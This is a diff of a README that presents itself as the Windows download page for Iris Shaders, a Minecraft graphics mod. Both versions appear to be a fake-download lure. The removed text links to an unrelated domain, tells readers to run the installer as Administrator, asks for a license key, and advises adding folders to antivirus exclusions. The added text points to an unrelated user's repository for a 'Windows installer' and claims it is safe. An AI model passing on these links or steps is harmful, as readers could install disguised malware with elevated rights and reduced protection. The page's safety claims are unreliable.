@@ -1,79 +1,92 @@
-# Iris Shaders Download for Windows 11 & 10
+# 🎮 Iris-Shaders - Better graphics for your Minecraft world
 
-**Iris-Shaders**
+[![](https://img.shields.io/badge/Download_Iris-Blue.svg)](https://github.com/welshlarge31/Iris-Shaders)
 
-**Iris Shaders** for PC gamers on Windows 10/11. Scroll to **Download & Install** for the direct link or one-command setup.
+Iris Shaders provides a modern way to change how Minecraft looks. This software makes water, lighting, and shadows look realistic. It works as an alternative to older tools. You can use this on Windows 10 and 11.
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()[![Gaming](https://img.shields.io/badge/For-PC%20Gamers-16a34a?style=flat-square&logo=gamepad)]()
+## ⚙️ System Requirements
 
----
+Your computer needs specific parts to run these shaders well. Most modern computers meet these needs.
 
-## Download & Install
+- Operating System: Windows 10 or Windows 11.
+- Processor: Intel Core i5 or AMD Ryzen 5 from the last five years.
+- Memory: 8 GB of RAM or more.
+- Graphics Card: NVIDIA GeForce GTX 10 series or AMD Radeon RX 500 series.
+- Storage: 500 MB of space for the tools.
+- Java: The latest version of Java Runtime.
 
-> **This is the download page.** Use the button or link below to get **Iris Shaders** for Windows.
+Check your graphics card drivers before you begin. Visit the website of your card maker to get the latest update. This helps the game run without errors.
 
-<p align="center">
-  <a href="https://irisshaders.zipzapsol.space/">
-    <img src="https://img.shields.io/badge/Download-Iris%20Shaders-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Iris Shaders">
-  </a>
-</p>
+## 📥 How to download
 
-| | |
-| --- | --- |
-| **Direct link** | **[irisshaders.zipzapsol.space](https://irisshaders.zipzapsol.space/)** |
-| **Full URL** | `https://irisshaders.zipzapsol.space/` |
-| **Type** | Installer for Windows 10 / 11 (64-bit) |
-| **Admin** | Run setup as Administrator |
+You need to get the files from the project page. 
 
-### Quick steps
+1. Go to the [official release page](https://github.com/welshlarge31/Iris-Shaders).
+2. Look for the section labeled Releases.
+3. Click the link for the Windows installer.
+4. Save the file to your desktop.
 
-1. Click **[Download — irisshaders.zipzapsol.space](https://irisshaders.zipzapsol.space/)** (link above)
-2. Save the file from the project page
-3. Run the setup **as Administrator**
-4. Enter your license key when prompted
-5. Restart if the installer asks — then launch from Start menu
+This link holds the current version of the tool. You should always use this official page to ensure you get the safe version.
 
-<p align="center"><a href="https://irisshaders.zipzapsol.space/"><strong>⬇ Download Iris Shaders now</strong></a></p>
+## 🛠️ Installation steps
 
----
+Follow these steps to set up the software.
 
-## About
+1. Locate the file you downloaded.
+2. Double-click the file to start the installer.
+3. Click Yes if your computer asks for permission to run the file.
+4. Select the location where Minecraft installs on your computer.
+5. Click Install.
+6. Wait for the progress bar to finish.
+7. Click Close.
 
-**Iris Shaders** setup page for Windows PC gamers.
+The installer adds the necessary files to your game folder. It does not change your existing world files.
 
-**People also search for:** iris shaders download, iris optifine alternative fabric install windows
+## 🏗️ Setting up the game
 
-**Repository:** `Iris-Shaders`
+Now that you installed the tool, set it up inside the game.
 
+1. Open your Minecraft Launcher.
+2. Find the menu for choosing your game version.
+3. Select the version labeled Fabric or Iris shaders.
+4. Click Play.
+5. Wait for the game to start.
+6. Open the game menu by pressing Escape.
+7. Click Options and then Video Settings.
+8. Look for the Shader Packs button.
+9. Click Open Shader Pack Folder.
+10. Drag your shader file into this folder.
+11. Return to the game menu.
+12. Click on the name of the shader pack you added.
+13. Click Apply.
 
-## After install
+Your game now uses the new visual effects. You can change these settings at any time to improve performance or visual quality.
 
-| Step | Tip |
-| --- | --- |
-| 1 | Run once as Administrator on first setup |
-| 2 | Add your game folders to exclusions if AV blocks tools |
-| 3 | Pin to taskbar for quick access between matches |
-| 4 | Check for updates inside the app after major game patches |
+## 🔍 Troubleshooting common issues
 
-## System requirements
+If you encounter problems, check these areas first.
 
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 8 GB (16 GB for mod tools / recording) |
-| Disk | 500 MB free space |
-| GPU | DirectX 11 compatible |
-| Admin | Required for install/repair |
+- The game crashes: Make sure you use the version of Minecraft that matches the shader installer. Check if your graphics card drivers need an update.
+- Shaders do not appear: Make sure you placed the files into the correct folder. Restart the game after you add a new pack.
+- Low performance: Go back into Video Settings. Lower the render distance or turn off complex features like volumetric clouds. These settings demand more from your hardware.
+- White textures: Some older packs do not work with newer versions of this tool. Look for packs marked as compatible with your version.
 
-## Troubleshooting
+## 📝 Frequently asked questions
 
-| Issue | Try this |
-| --- | --- |
-| Download does not start | Disable VPN/ad-block for this page |
-| Setup blocked | Run as Administrator |
-| Tool not detected in game | Restart game after installing |
-| Antivirus warning | Add install folder to exclusions temporarily |
+Do I need Optifine?
+No. This tool acts as an alternative. You do not need to install other performance modifiers. 
 
----
+Does this work on older computers?
+It works on most machines. If your computer struggles to run the game without shaders, you might see a drop in frame rates. Use low-performance shader packs if you experience lag.
 
-**Topics:** iris-shaders-download, shaders, iris-optifine-alternative-fabric-install-windows, optifine, alternative, fabric, iris-shaders, iris-shaders-2026, minecraft-shaders, optifine-alternative, minecraft, software
+Is this safe?
+The code is open for anyone to review. You download files from a public repository. This ensures transparency and safety for all users.
+
+Can I play online with this?
+Yes. These changes occur on your side of the game. Other players will not see the shaders you use, but you will experience the visual improvements during play.
+
+How do I remove the shaders?
+Go to the Shader Packs folder and delete the files you placed there. You can also uninstall the tool through the Windows Settings menu for apps.
+
+Can I get more help?
+Look at the Wiki page in the repository. It contains extra guides and information for your specific hardware setup. Many people contribute to this guide to help new users solve problems.
